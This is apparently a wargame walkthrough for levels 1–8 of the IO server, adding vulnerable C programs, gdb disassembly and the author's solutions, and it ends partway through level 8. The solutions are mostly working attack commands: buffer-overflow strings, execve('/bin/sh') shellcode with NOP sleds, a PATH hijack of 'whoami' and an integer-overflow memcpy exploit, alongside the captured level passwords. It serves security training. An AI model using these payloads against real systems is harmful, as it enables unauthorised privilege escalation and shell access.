@@ -1,0 +1,732 @@
+IO solutions:
+Start with "ssh level1@io.netgarage.org" with password "level1"
+Check out the README file for further instructions
+
+
+LEVEL1:
+*******
+use the bash command line code: for VARIABLE in {000..999}; do echo $VARIABLE | ./level01; echo $VARIABLE; done
+Results in the code being '271'
+
+level1@io:/levels$ ./level01
+Enter the 3 digit passcode to enter: 271
+Congrats you found it, now read the password for level2 from /home/level2/.pass
+sh-4.2$ cat /home/level2/.pass
+3ywr07ZFw5IsdKzU
+
+
+LEVEL2:
+*******
+level2@io:/levels$ ./level02 -8438457923847925 -1
+source code is available in level02.c
+
+WIN!
+sh-4.2$ id
+uid=1003(level3) gid=1002(level2) groups=1003(level3),1002(level2),1029(nosu)
+sh-4.2$ cd /home/level3
+sh-4.2$ ls -al
+total 272
+dr-xr-x--x  2 level3 level3   4096 Oct  9 20:31 .
+drwxr-xr-x 35 root   root     4096 Mar  9 00:09 ..
+-r-xr-x---  1 root   level3     54 Jun 23  2011 explainlevel2_alt.sh
+-r-xr-x---  1 root   level3     50 Jun 15  2011 explainlevel2.sh
+-r--r-----  1 root   level3   5161 Jun 23  2011 .level2_alt.tpp
+-r--r-----  1 root   level3   8606 Aug 13  2012 .level2.tpp
+-r--------  1 level3 level3     17 Sep  9  2014 .pass
+-rw-r--r--  1 root   root   108241 Jul 21  2013 t
+-rw-r--r--  1 level3 level3 119364 Mar  6 02:52 tags
+-r--r--r--  1 root   root     2246 Oct  9  2012 .vimrc
+sh-4.2$ more .pass
+IFd92yzOnSMv9tkX
+
+
+LEVEL3
+******
+level03.c
+
+#include <stdio.h>
+#include <string.h>
+
+void good()
+{
+        puts("Win.");
+        execl("/bin/sh", "sh", NULL);
+}
+void bad()
+{
+        printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
+}
+
+int main(int argc, char **argv, char **envp)
+{
+        void (*functionpointer)(void) = bad;
+        char buffer[50];
+
+        if(argc != 2 || strlen(argv[1]) < 4)
+                return 0;
+
+        memcpy(buffer, argv[1], strlen(argv[1]));
+        memset(buffer, 0, strlen(argv[1]) - 4);
+
+        printf("This is exciting we're going to %p\n", functionpointer);
+        functionpointer();
+
+        return 0;
+}
+
+(gdb) disassemble  good
+Dump of assembler code for function good:
+   0x08048474 <+0>: push   ebp
+   0x08048475 <+1>: mov    ebp,esp
+   0x08048477 <+3>: sub    esp,0x18
+   0x0804847a <+6>: mov    DWORD PTR [esp],0x8048660
+   0x08048481 <+13>:  call   0x80483bc <puts@plt>
+   0x08048486 <+18>:  mov    DWORD PTR [esp+0x8],0x0
+   0x0804848e <+26>:  mov    DWORD PTR [esp+0x4],0x8048665
+   0x08048496 <+34>:  mov    DWORD PTR [esp],0x8048668
+   0x0804849d <+41>:  call   0x804837c <execl@plt>
+   0x080484a2 <+46>:  leave  
+   0x080484a3 <+47>:  ret    
+End of assembler dump.
+
+(gdb) disassemble bad
+Dump of assembler code for function bad:
+   0x080484a4 <+0>: push   ebp
+   0x080484a5 <+1>: mov    ebp,esp
+   0x080484a7 <+3>: sub    esp,0x18
+   0x080484aa <+6>: mov    DWORD PTR [esp+0x8],0x8048474
+   0x080484b2 <+14>:  mov    DWORD PTR [esp+0x4],0x80484a4
+   0x080484ba <+22>:  mov    DWORD PTR [esp],0x8048680
+   0x080484c1 <+29>:  call   0x80483ac <printf@plt>
+   0x080484c6 <+34>:  leave  
+   0x080484c7 <+35>:  ret    
+End of assembler dump.
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x080484c8 <+0>:	push   ebp
+   0x080484c9 <+1>:	mov    ebp,esp
+   0x080484cb <+3>:	sub    esp,0x78
+   0x080484ce <+6>:	and    esp,0xfffffff0
+   0x080484d1 <+9>:	mov    eax,0x0
+   0x080484d6 <+14>:	sub    esp,eax
+   0x080484d8 <+16>:	mov    DWORD PTR [ebp-0xc],0x80484a4
+   0x080484df <+23>:	cmp    DWORD PTR [ebp+0x8],0x2
+   0x080484e3 <+27>:	jne    0x80484fc <main+52>
+   0x080484e5 <+29>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080484e8 <+32>:	add    eax,0x4
+   0x080484eb <+35>:	mov    eax,DWORD PTR [eax]
+   0x080484ed <+37>:	mov    DWORD PTR [esp],eax
+   0x080484f0 <+40>:	call   0x804839c <strlen@plt>
+   0x080484f5 <+45>:	cmp    eax,0x3
+   0x080484f8 <+48>:	jbe    0x80484fc <main+52>
+   0x080484fa <+50>:	jmp    0x8048505 <main+61>
+   0x080484fc <+52>:	mov    DWORD PTR [ebp-0x5c],0x0
+   0x08048503 <+59>:	jmp    0x8048579 <main+177>
+   0x08048505 <+61>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048508 <+64>:	add    eax,0x4
+   0x0804850b <+67>:	mov    eax,DWORD PTR [eax]
+   0x0804850d <+69>:	mov    DWORD PTR [esp],eax
+   0x08048510 <+72>:	call   0x804839c <strlen@plt>
+   0x08048515 <+77>:	mov    DWORD PTR [esp+0x8],eax
+   0x08048519 <+81>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x0804851c <+84>:	add    eax,0x4
+   0x0804851f <+87>:	mov    eax,DWORD PTR [eax]
+   0x08048521 <+89>:	mov    DWORD PTR [esp+0x4],eax
+   0x08048525 <+93>:	lea    eax,[ebp-0x58]
+   0x08048528 <+96>:	mov    DWORD PTR [esp],eax
+   0x0804852b <+99>:	call   0x804838c <memcpy@plt>
+   0x08048530 <+104>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048533 <+107>:	add    eax,0x4
+   0x08048536 <+110>:	mov    eax,DWORD PTR [eax]
+   0x08048538 <+112>:	mov    DWORD PTR [esp],eax
+   0x0804853b <+115>:	call   0x804839c <strlen@plt>
+   0x08048540 <+120>:	sub    eax,0x4
+   0x08048543 <+123>:	mov    DWORD PTR [esp+0x8],eax
+   0x08048547 <+127>:	mov    DWORD PTR [esp+0x4],0x0
+   0x0804854f <+135>:	lea    eax,[ebp-0x58]
+   0x08048552 <+138>:	mov    DWORD PTR [esp],eax
+   0x08048555 <+141>:	call   0x804835c <memset@plt>
+   0x0804855a <+146>:	mov    eax,DWORD PTR [ebp-0xc]
+   0x0804855d <+149>:	mov    DWORD PTR [esp+0x4],eax
+   0x08048561 <+153>:	mov    DWORD PTR [esp],0x80486c0
+   0x08048568 <+160>:	call   0x80483ac <printf@plt>
+   0x0804856d <+165>:	mov    eax,DWORD PTR [ebp-0xc]
+   0x08048570 <+168>:	call   eax
+   0x08048572 <+170>:	mov    DWORD PTR [ebp-0x5c],0x0
+   0x08048579 <+177>:	mov    eax,DWORD PTR [ebp-0x5c]
+   0x0804857c <+180>:	leave  
+   0x0804857d <+181>:	ret    
+End of assembler dump.
+
+level3@io:/levels$ ./level03 $(python -c "print 'A'*76+'\x74\x84\x04\x08'")
+This is exciting we're going to 0x8048474
+Win.
+sh-4.2$ id
+uid=1003(level3) gid=1003(level3) euid=1004(level4) groups=1004(level4),1003(level3),1029(nosu)
+sh-4.2$ cd /home/level4
+sh-4.2$ ls
+tags
+sh-4.2$ ls -al
+total 108
+dr-xr-x--x  2 level4 level4  4096 Oct  9 20:31 .
+drwxr-xr-x 35 root   root    4096 Mar  9 00:09 ..
+-r--------  1 level4 level4    17 Sep  9  2014 .pass
+-rw-r--r--  1 level4 level4 93573 Mar  6 21:35 tags
+-r--r--r--  1 root   root    2246 Oct  9  2012 .vimrc
+sh-4.2$ more .pass
+nSwmULj2LpDnRGU2
+
+LEVEL4
+*******
+level4@io:/levels$ more level04.c
+//writen by bla
+#include <stdlib.h>
+#include <stdio.h>
+
+int main() {
+        char username[1024];
+        FILE* f = popen("whoami","r");
+        fgets(username, sizeof(username), f);
+        printf("Welcome %s", username);
+
+        return 0;
+}
+
+level4@io:/levels$ more level04_alt.c
+//written by bla
+#include <stdlib.h>
+int main(){
+	setresuid(geteuid(), geteuid(), geteuid());
+	system("/usr/bin/id");
+}
+
+Took advantage of "whoami" running as a shell process.  
+modified the PATH variable to put the /tmp/karl dir at the front..
+
+level4@io:~$ echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+
+level4@io:~$ export PATH=/tmp/karl:$PATH
+level4@io:~$ echo $PATH
+/tmp/karl:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+
+Then I wrote a new executable for "whoami" that would be called by the ./level04 program
+Knowing the structure of where the password was, I wrote "cat /home/level5/.pass"
+
+level4@io:/levels$ ./level04
+Welcome LOoCy5PbKi63qXTh
+
+LEVEL5
+*******
+
+level5@io:/levels$ more level05.c
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv) {
+
+	char buf[128];
+
+	if(argc < 2) return 1;
+
+	strcpy(buf, argv[1]);
+
+	printf("%s\n", buf);	
+
+	return 0;
+}
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x080483b4 <+0>: push   ebp
+   0x080483b5 <+1>: mov    ebp,esp
+   0x080483b7 <+3>: sub    esp,0xa8
+   0x080483bd <+9>: and    esp,0xfffffff0
+   0x080483c0 <+12>:  mov    eax,0x0
+   0x080483c5 <+17>:  sub    esp,eax
+   0x080483c7 <+19>:  cmp    DWORD PTR [ebp+0x8],0x1
+   0x080483cb <+23>:  jg     0x80483d9 <main+37>
+   0x080483cd <+25>:  mov    DWORD PTR [ebp-0x8c],0x1
+   0x080483d7 <+35>:  jmp    0x8048413 <main+95>
+   0x080483d9 <+37>:  mov    eax,DWORD PTR [ebp+0xc]
+   0x080483dc <+40>:  add    eax,0x4
+   0x080483df <+43>:  mov    eax,DWORD PTR [eax]
+   0x080483e1 <+45>:  mov    DWORD PTR [esp+0x4],eax
+   0x080483e5 <+49>:  lea    eax,[ebp-0x88]
+   0x080483eb <+55>:  mov    DWORD PTR [esp],eax
+   0x080483ee <+58>:  call   0x80482d4 <strcpy@plt>
+   0x080483f3 <+63>:  lea    eax,[ebp-0x88]
+   0x080483f9 <+69>:  mov    DWORD PTR [esp+0x4],eax
+   0x080483fd <+73>:  mov    DWORD PTR [esp],0x8048524
+   0x08048404 <+80>:  call   0x80482b4 <printf@plt>
+   0x08048409 <+85>:  mov    DWORD PTR [ebp-0x8c],0x0
+   0x08048413 <+95>:  mov    eax,DWORD PTR [ebp-0x8c]
+   0x08048419 <+101>: leave  
+   0x0804841a <+102>: ret    
+End of assembler dump.
+
+
+(gdb) run $(python -c "print '\x90'*140")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /levels/level05 $(python -c "print '\x90'*140")
+????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7e98416 in _setjmp () from /lib/i386-linux-gnu/i686/cmov/libc.so.6
+
+(gdb) info register
+eax            0x0  0
+ecx            0xbffffb68 -1073743000
+edx            0x9090904c -1869574068
+ebx            0xb7fceff4 -1208160268
+esp            0xbffffc2c 0xbffffc2c
+ebp            0x90909090 0x90909090
+esi            0x0  0
+edi            0x0  0
+eip            0xb7e98416 0xb7e98416 <_setjmp+6>
+eflags         0x210246 [ PF ZF IF RF ID ]
+cs             0x73 115
+ss             0x7b 123
+ds             0x7b 123
+es             0x7b 123
+fs             0x0  0
+gs             0x33 51
+
+(gdb) x/200x $esp
+0xbffffc2c: 0xb7e84e0b  0x414140fd  0xbffffcd4  0xbffffce0
+0xbffffc3c: 0xb7fe0860  0xb7ff6821  0x0177ff8e  0xb7ffeff4
+0xbffffc4c: 0x0804820b  0x00000001  0xbffffc90  0xb7fefc16
+0xbffffc5c: 0xb7fffac0  0xb7fe0b58  0xb7fceff4  0x00000000
+0xbffffc6c: 0x00000000  0xbffffca8  0x43b6af39  0x6cd2d929
+0xbffffc7c: 0x00000000  0x00000000  0x00000000  0x00000002
+0xbffffc8c: 0x080482f0  0x00000000  0xb7ff59c0  0xb7e84d6b
+0xbffffc9c: 0xb7ffeff4  0x00000002  0x080482f0  0x00000000
+0xbffffcac: 0x08048311  0x080483b4  0x00000002  0xbffffcd4
+0xbffffcbc: 0x08048470  0x08048420  0xb7ff0590  0xbffffccc
+0xbffffccc: 0xb7fff908  0x00000002  0xbffffde5  0xbffffdf5
+0xbffffcdc: 0x00000000  0xbffffe82  0xbffffe92  0xbffffea6
+0xbffffcec: 0xbffffec9  0xbffffedd  0xbffffee9  0xbffffef5
+0xbffffcfc: 0xbfffff33  0xbfffff49  0xbfffff58  0xbfffff64
+0xbffffd0c: 0xbfffff75  0xbfffff7e  0xbfffff90  0xbfffff98
+0xbffffd1c: 0xbfffffaa  0xbfffffb9  0x00000000  0x00000020
+0xbffffd2c: 0xb7fe1414  0x00000021  0xb7fe1000  0x00000010
+0xbffffd3c: 0x078bfbfd  0x00000006  0x00001000  0x00000011
+0xbffffd4c: 0x00000064  0x00000003  0x08048034  0x00000004
+0xbffffd5c: 0x00000020  0x00000005  0x00000007  0x00000007
+0xbffffd6c: 0xb7fe2000  0x00000008  0x00000000  0x00000009
+0xbffffd7c: 0x080482f0  0x0000000b  0x000003ed  0x0000000c
+0xbffffd8c: 0x000003ed  0x0000000d  0x000003ed  0x0000000e
+0xbffffd9c: 0x000003ed  0x00000017  0x00000000  0x00000019
+0xbffffdac: 0xbffffdcb  0x0000001f  0xbfffffec  0x0000000f
+0xbffffdbc: 0xbffffddb  0x00000000  0x00000000  0xbb000000
+0xbffffdcc: 0x67dada57  0x3a235e27  0x43fb3d2d  0x6925f95c
+0xbffffddc: 0x00363836  0x00000000  0x656c2f00  0x736c6576
+0xbffffdec: 0x76656c2f  0x35306c65  0x41414100  0x41414141
+0xbffffdfc: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffffe0c: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffffe1c: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffffe2c: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffffe3c: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffffe4c: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffffe5c: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffffe6c: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffffe7c: 0x41414141  0x48530041  0x3d4c4c45  0x6e69622f
+0xbffffe8c: 0x7361622f  0x45540068  0x783d4d52  0x6d726574
+---Type <return> to continue, or q <return> to quit---
+0xbffffe9c: 0x3635322d  0x6f6c6f63  0x53530072  0x4c435f48
+0xbffffeac: 0x544e4549  0x3932313d  0x3637312e  0x3739312e
+0xbffffebc: 0x2033322e  0x34303332  0x32322039  0x48535300
+0xbffffecc: 0x5954545f  0x65642f3d  0x74702f76  0x39312f73
+0xbffffedc: 0x45535500  0x656c3d52  0x356c6576  0x4c4f4300
+0xbffffeec: 0x534e4d55  0x3431313d  0x54415000  0x752f3d48
+0xbffffefc: 0x6c2f7273  0x6c61636f  0x6e69622f  0x73752f3a
+0xbfffff0c: 0x69622f72  0x622f3a6e  0x2f3a6e69  0x2f727375
+0xbfffff1c: 0x61636f6c  0x61672f6c  0x3a73656d  0x7273752f
+0xbfffff2c: 0x6d61672f  0x4d007365  0x3d4c4941  0x7261762f
+0xbfffff3c: 0x69616d2f  0x656c2f6c  0x356c6576  0x2f3d5f00
+
+So, we can put our pointer anywhere in the NOP space (0x41414141) areas
+
+choose 0xbffffe0c for example:
+
+level5@io:/levels$ ./level05 $(python -c 'print "\x90"*102 + "\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh" + "\x1c\xfe\xff\xbf"')
+???????????????????????????????????????????????????????????????????????????????????????????????????????^?1??F?F
+                                                                                                               ??V
+                                                                                                                 ?
+                                                                                                                 ̀?????/bin/sh???
+sh-4.2$ id
+uid=1005(level5) gid=1005(level5) euid=1006(level6) groups=1006(level6),1005(level5),1029(nosu)
+
+sh-4.2$ cat /home/level6/.pass
+rXCikld0ex3EQsnI
+
+OR!!!
+
+level5@io:/levels$ ./level05 $(python -c "print '\x90'*117 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'+'\x60\xfe\xff\xbf'")
+?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?Ph//shh/bin??PS??
+                                                                                                                                        ̀`???
+sh-4.2$ id
+uid=1005(level5) gid=1005(level5) euid=1006(level6) groups=1006(level6),1005(level5),1029(nosu)
+
+***********
+* LEVEL 6 *
+***********
+
+level6@io:/levels$ cat level06.c
+//written by bla
+//inspired by nnp
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+enum{
+LANG_ENGLISH,
+LANG_FRANCAIS,
+LANG_DEUTSCH,
+};
+
+int language = LANG_ENGLISH;
+
+struct UserRecord{
+  char name[40];
+  char password[32];
+  int id;
+};
+
+void greetuser(struct UserRecord user){
+  char greeting[64];
+  switch(language){
+    case LANG_ENGLISH:
+      strcpy(greeting, "Hi "); break;
+    case LANG_FRANCAIS:
+      strcpy(greeting, "Bienvenue "); break;
+    case LANG_DEUTSCH:
+      strcpy(greeting, "Willkommen "); break;
+  }
+  strcat(greeting, user.name);
+  printf("%s\n", greeting);
+}
+
+int main(int argc, char **argv, char **env){
+  if(argc != 3) {
+    printf("USAGE: %s [name] [password]\n", argv[0]);
+    return 1;
+  }
+
+  struct UserRecord user = {0};
+  strncpy(user.name, argv[1], sizeof(user.name));
+  strncpy(user.password, argv[2], sizeof(user.password));
+
+  char *envlang = getenv("LANG");
+  if(envlang)
+    if(!memcmp(envlang, "fr", 2))
+      language = LANG_FRANCAIS;
+    else if(!memcmp(envlang, "de", 2))
+      language = LANG_DEUTSCH;
+
+  greetuser(user);
+}
+
+
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x08048593 <+0>: push   ebp
+   0x08048594 <+1>: mov    ebp,esp
+   0x08048596 <+3>: push   edi
+   0x08048597 <+4>: push   esi
+   0x08048598 <+5>: push   ebx
+   0x08048599 <+6>: and    esp,0xfffffff0
+   0x0804859c <+9>: sub    esp,0xa0
+   0x080485a2 <+15>:  cmp    DWORD PTR [ebp+0x8],0x3
+   0x080485a6 <+19>:  je     0x80485c7 <main+52>
+   0x080485a8 <+21>:  mov    eax,DWORD PTR [ebp+0xc]
+   0x080485ab <+24>:  mov    eax,DWORD PTR [eax]
+   0x080485ad <+26>:  mov    DWORD PTR [esp+0x4],eax
+   0x080485b1 <+30>:  mov    DWORD PTR [esp],0x8048750
+   0x080485b8 <+37>:  call   0x80483b0 <printf@plt>
+   0x080485bd <+42>:  mov    eax,0x1
+   0x080485c2 <+47>:  jmp    0x80486af <main+284>
+   0x080485c7 <+52>:  lea    ebx,[esp+0x50]
+   0x080485cb <+56>:  mov    eax,0x0
+   0x080485d0 <+61>:  mov    edx,0x13
+   0x080485d5 <+66>:  mov    edi,ebx
+   0x080485d7 <+68>:  mov    ecx,edx
+   0x080485d9 <+70>:  rep stos DWORD PTR es:[edi],eax
+   0x080485db <+72>:  mov    eax,DWORD PTR [ebp+0xc]
+   0x080485de <+75>:  add    eax,0x4
+   0x080485e1 <+78>:  mov    eax,DWORD PTR [eax]
+   0x080485e3 <+80>:  mov    DWORD PTR [esp+0x8],0x28
+   0x080485eb <+88>:  mov    DWORD PTR [esp+0x4],eax
+   0x080485ef <+92>:  lea    eax,[esp+0x50]
+   0x080485f3 <+96>:  mov    DWORD PTR [esp],eax
+   0x080485f6 <+99>:  call   0x8048420 <strncpy@plt>
+   0x080485fb <+104>: mov    eax,DWORD PTR [ebp+0xc]
+   0x080485fe <+107>: add    eax,0x8
+   0x08048601 <+110>: mov    eax,DWORD PTR [eax]
+   0x08048603 <+112>: mov    DWORD PTR [esp+0x8],0x20
+   0x0804860b <+120>: mov    DWORD PTR [esp+0x4],eax
+   0x0804860f <+124>: lea    eax,[esp+0x50]
+   0x08048613 <+128>: add    eax,0x28
+   0x08048616 <+131>: mov    DWORD PTR [esp],eax
+   0x08048619 <+134>: call   0x8048420 <strncpy@plt>
+   0x0804861e <+139>: mov    DWORD PTR [esp],0x804876d
+   0x08048625 <+146>: call   0x80483e0 <getenv@plt>
+   0x0804862a <+151>: mov    DWORD PTR [esp+0x9c],eax
+   0x08048631 <+158>: cmp    DWORD PTR [esp+0x9c],0x0
+   0x08048639 <+166>: je     0x8048697 <main+260>
+   0x0804863b <+168>: mov    DWORD PTR [esp+0x8],0x2
+   0x08048643 <+176>: mov    DWORD PTR [esp+0x4],0x8048772
+   0x0804864b <+184>: mov    eax,DWORD PTR [esp+0x9c]
+   0x08048652 <+191>: mov    DWORD PTR [esp],eax
+   0x08048655 <+194>: call   0x80483c0 <memcmp@plt>
+   0x0804865a <+199>: test   eax,eax
+   0x0804865c <+201>: jne    0x804866a <main+215>
+   0x0804865e <+203>: mov    DWORD PTR ds:0x8049964,0x1
+   0x08048668 <+213>: jmp    0x8048697 <main+260>
+   0x0804866a <+215>: mov    DWORD PTR [esp+0x8],0x2
+   0x08048672 <+223>: mov    DWORD PTR [esp+0x4],0x8048775
+   0x0804867a <+231>: mov    eax,DWORD PTR [esp+0x9c]
+   0x08048681 <+238>: mov    DWORD PTR [esp],eax
+   0x08048684 <+241>: call   0x80483c0 <memcmp@plt>
+   0x08048689 <+246>: test   eax,eax
+   0x0804868b <+248>: jne    0x8048697 <main+260>
+   0x0804868d <+250>: mov    DWORD PTR ds:0x8049964,0x2
+   0x08048697 <+260>: mov    edx,esp
+   0x08048699 <+262>: lea    ebx,[esp+0x50]
+   0x0804869d <+266>: mov    eax,0x13
+   0x080486a2 <+271>: mov    edi,edx
+   0x080486a4 <+273>: mov    esi,ebx
+   0x080486a6 <+275>: mov    ecx,eax
+   0x080486a8 <+277>: rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
+   0x080486aa <+279>: call   0x804851c <greetuser>
+   0x080486af <+284>: lea    esp,[ebp-0xc]
+=> 0x080486b2 <+287>: pop    ebx
+   0x080486b3 <+288>: pop    esi
+   0x080486b4 <+289>: pop    edi
+   0x080486b5 <+290>: pop    ebp
+   0x080486b6 <+291>: ret    
+End of assembler dump.
+
+Used shellcode for the username and called it with the password.  The shellcode goes in various places, just need to play around to call the correct one.
+
+level6@io:/levels$ ./level06 $(python -c "print '\x90' *17 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + ' '+  'B'* 25 + '\xe0\xfb\xff\xbf'")
+Willkommen ?????????????????1?Ph//shh/bin??PS??
+                                               ̀BBBBBBBBBBBBBBBBBBBBBBBBB????
+sh-4.2$ cat /home/level7/.pass
+Nsr869Iyc0sFCX7I
+
+level6@io:/levels$ ./level06 $(python -c "print '\x90' *17 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + ' '+  'B'* 26 + '\x30\xfc\xff\xbf'")
+Bienvenue ?????????????????1?Ph//shh/bin??PS??
+                                              ̀BBBBBBBBBBBBBBBBBBBBBBBBBB0???
+sh-4.2$ id
+uid=1006(level6) gid=1006(level6) euid=1007(level7) groups=1007(level7),1006(level6),1029(nosu)
+sh-4.2$ cat /home/level7/.pass
+Nsr869Iyc0sFCX7I
+
+**** I'm not sure why the pointer location is what it is  ****
+
+(gdb) x/200x $esp
+0xbffffbb0: 0x90909000  0x90909090  0x90909090  0x90909090
+0xbffffbc0: 0x50c03190  0x732f2f68  0x622f6868  0xe3896e69
+0xbffffbd0: 0xe1895350  0x80cd0bb0  0x42424242  0x42424242
+0xbffffbe0: 0x42424242  0x42424242  0x42424242  0x42424242
+0xbffffbf0: 0x43434242  0x00004343  0x00000000  0x00000001
+0xbffffc00: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffffc10: 0x50c03190  0x732f2f68  0x622f6868  0xe3896e69
+0xbffffc20: 0xe1895350  0x80cd0bb0  0x42424242  0x42424242
+0xbffffc30: 0x42424242  0x42424242  0x42424242  0x42424242
+0xbffffc40: 0x43434242  0x00004343  0x00000000  0xbfffff72
+0xbffffc50: 0xb7e9d515  0xb7ff0590  0x080486db  0xb7fceff4
+0xbffffc60: 0x00000000  0x00000000  0xbffffce8  0xb7e84e46
+0xbffffc70: 0x00000003  0xbffffd14  0xbffffd24  0xb7fe0860
+0xbffffc80: 0xb7ff6821  0xffffffff  0xb7ffeff4  0x080482da
+0xbffffc90: 0x00000001  0xbffffcd0  0xb7fefc16  0xb7fffac0
+0xbffffca0: 0xb7fe0b58  0xb7fceff4  0x00000000  0x00000000
+0xbffffcb0: 0xbffffce8  0x1427936f  0x3b43657f  0x00000000
+0xbffffcc0: 0x00000000  0x00000000  0x00000003  0x08048430
+0xbffffcd0: 0x00000000  0xb7ff59c0  0xb7e84d6b  0xb7ffeff4
+0xbffffce0: 0x00000003  0x08048430  0x00000000  0x08048451
+0xbffffcf0: 0x08048593  0x00000003  0xbffffd14  0x080486d0
+0xbffffd00: 0x080486c0  0xb7ff0590  0xbffffd0c  0xb7fff908
+
+Based on gdb info, I would have expected the pointer location to be at 0xbffffc00 (where the NOPs are, also, use 0xbffffc00 because \x00 is a NULL) for the french case (it wants 0xbffffc30).  While the \x01 pointer location works in gdb, it does not provide priviledge escalation.
+
+
+***********
+* LEVEL 7 *
+***********
+
+level7@io:/levels$ more level07.c
+//written by bla
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+
+
+int main(int argc, char **argv)
+{
+
+        int count = atoi(argv[1]);
+        int buf[10];
+
+        if(count >= 10 ) 
+                return 1;
+
+
+        memcpy(buf, argv[2], count * sizeof(int));
+
+        if(count == 0x574f4c46) {
+    printf("WIN!\n");
+                execl("/bin/sh", "sh" ,NULL);
+  } else
+                printf("Not today son\n");
+
+
+        return 0;
+}
+
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x08048414 <+0>: push   ebp
+   0x08048415 <+1>: mov    ebp,esp
+   0x08048417 <+3>: sub    esp,0x68
+   0x0804841a <+6>: and    esp,0xfffffff0
+   0x0804841d <+9>: mov    eax,0x0
+   0x08048422 <+14>:  sub    esp,eax
+   0x08048424 <+16>:  mov    eax,DWORD PTR [ebp+0xc]
+   0x08048427 <+19>:  add    eax,0x4
+   0x0804842a <+22>:  mov    eax,DWORD PTR [eax]
+   0x0804842c <+24>:  mov    DWORD PTR [esp],eax
+   0x0804842f <+27>:  call   0x8048354 <atoi@plt>
+   0x08048434 <+32>:  mov    DWORD PTR [ebp-0xc],eax
+   0x08048437 <+35>:  cmp    DWORD PTR [ebp-0xc],0x9
+   0x0804843b <+39>:  jle    0x8048446 <main+50>
+   0x0804843d <+41>:  mov    DWORD PTR [ebp-0x4c],0x1
+   0x08048444 <+48>:  jmp    0x80484ad <main+153>
+   0x08048446 <+50>:  mov    eax,DWORD PTR [ebp-0xc]
+   0x08048449 <+53>:  shl    eax,0x2
+   0x0804844c <+56>:  mov    DWORD PTR [esp+0x8],eax
+   0x08048450 <+60>:  mov    eax,DWORD PTR [ebp+0xc]
+   0x08048453 <+63>:  add    eax,0x8
+   0x08048456 <+66>:  mov    eax,DWORD PTR [eax]
+   0x08048458 <+68>:  mov    DWORD PTR [esp+0x4],eax
+   0x0804845c <+72>:  lea    eax,[ebp-0x48]
+   0x0804845f <+75>:  mov    DWORD PTR [esp],eax
+   0x08048462 <+78>:  call   0x8048334 <memcpy@plt>
+   0x08048467 <+83>:  cmp    DWORD PTR [ebp-0xc],0x574f4c46
+   0x0804846e <+90>:  jne    0x804849a <main+134>
+   0x08048470 <+92>:  mov    DWORD PTR [esp],0x8048584
+   0x08048477 <+99>:  call   0x8048344 <printf@plt>
+   0x0804847c <+104>: mov    DWORD PTR [esp+0x8],0x0
+   0x08048484 <+112>: mov    DWORD PTR [esp+0x4],0x804858a
+   0x0804848c <+120>: mov    DWORD PTR [esp],0x804858d
+   0x08048493 <+127>: call   0x8048324 <execl@plt>
+   0x08048498 <+132>: jmp    0x80484a6 <main+146>
+   0x0804849a <+134>: mov    DWORD PTR [esp],0x8048595
+   0x080484a1 <+141>: call   0x8048344 <printf@plt>
+   0x080484a6 <+146>: mov    DWORD PTR [ebp-0x4c],0x0
+   0x080484ad <+153>: mov    eax,DWORD PTR [ebp-0x4c]
+   0x080484b0 <+156>: leave  
+   0x080484b1 <+157>: ret    
+End of assembler dump.
+
+level7@io:/levels$ ./level07 -2147483600 $(python -c "print '\x46\x4c\x4f\x57'*100")
+WIN!
+sh-4.2$ id
+uid=1007(level7) gid=1007(level7) euid=1008(level8) groups=1008(level8),1007(level7),1029(nosu)
+sh-4.2$ cat /home/level8/.pass
+31L5mKO0ZwTrLeFe
+
+***********
+* LEVEL 8 *
+***********
+
+level8@io:/levels$ more level08.cpp
+// writen by bla for io.smashthestack.org
+#include <iostream>
+#include <cstring>
+#include <unistd.h>
+
+class Number
+{
+        public:
+                Number(int x) : number(x) {}
+                void setAnnotation(char *a) {memcpy(annotation, a, strlen(a));}
+                virtual int operator+(Number &r) {return number + r.number;}
+        private:
+                char annotation[100];
+                int number;
+};
+
+
+int main(int argc, char **argv)
+{
+        if(argc < 2) _exit(1);
+
+        Number *x = new Number(5);
+        Number *y = new Number(6);
+        Number &five = *x, &six = *y;
+
+        five.setAnnotation(argv[1]);
+
+        return six + five;
+}
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x08048694 <+0>: push   ebp
+   0x08048695 <+1>: mov    ebp,esp
+=> 0x08048697 <+3>: and    esp,0xfffffff0
+   0x0804869a <+6>: push   ebx
